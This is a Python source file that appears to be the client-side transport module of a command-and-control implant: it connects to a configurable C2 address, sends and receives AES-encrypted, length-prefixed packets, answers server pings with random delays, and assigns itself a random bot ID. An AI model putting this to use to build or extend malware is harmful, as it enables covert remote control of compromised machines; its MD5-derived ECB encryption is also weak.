import socket
import hashlib
import base64
import random
import threading
import time
import gzip

from Crypto.Cipher import AES

def unpad(data):
    return data[:-data[-1]]

def pad(data):
    return data+(16-len(data)%16)*bytes([16-len(data)%16])

def aes_dec(key,data):
    return unpad(key.decrypt(data))

def aes_enc(key,data):
    return key.encrypt(pad(data))


class proto:
    def __init__(self,c2ip,c2port,splitter,log,conkey=None):
        self.c2ip  =c2ip
        self.c2port=c2port
        self.conkey=conkey
        self.splitt=splitter

        self.log = log
        
        if conkey:
            self.get_netcon_key()
        else:
            self.ckey = None

        self.genid()
        
        self.conn_c2()
        self.events = []

    def get_netcon_key(self):
        ck = bytes.fromhex(hashlib.md5(self.conkey).hexdigest())
        self.ckey = AES.new(ck, AES.MODE_ECB)

    def start_recver(self):
        threading.Thread(target=self.recver).start()

    def conn_c2(self):
        self.sock = socket.socket()
        self.sock.connect((self.c2ip,self.c2port))

    def send_packet(self,packet):
        if self.ckey:
            dat = aes_enc(self.ckey,packet)
        else:
            dat = packet
        
        self.log.print(f"SENDING {len(dat)} BYTES")
        to_send = str(len(dat)).encode()+b'\x00'+dat
        for i in range(0,len(to_send),520000):
            ch = to_send[i:i+520000]
            self.sock.send(ch)
            self.log.print(f"SENT {len(ch)} BYTES -> CHUNK N{i//520000}")

    def cer_pack(self,data_arr):
        return self.splitt.join(data_arr)

    def raw_recv(self):
        sz =  ''
        x =   b''
        res = b''
        while x != b'\x00':
            sz += x.decode()
            x = self.sock.recv(1)
            
        sz=int(sz)
        
        while sz != 0:
            data = self.sock.recv(sz)
            sz -= len(data)
            res += data

        return res

    def recv(self):
        dat = self.raw_recv()
        if self.ckey:
            return aes_dec(self.ckey,dat).split(self.splitt)
        else:
            return dat.split(self.splitt)
            
    def recver(self):
        while True:
            rv = self.recv()
            time.sleep(random.random())
            self.log.print(f"RECVED {rv[0]}")
            if rv[0] == b'PING!':
                self.send(b'pong',b'10')

            self.events.append(rv)

    def genid(self):
        self.id_ = random.randbytes(10).hex().upper().encode()

    def send(self,*data):
        self.send_packet(self.cer_pack(data))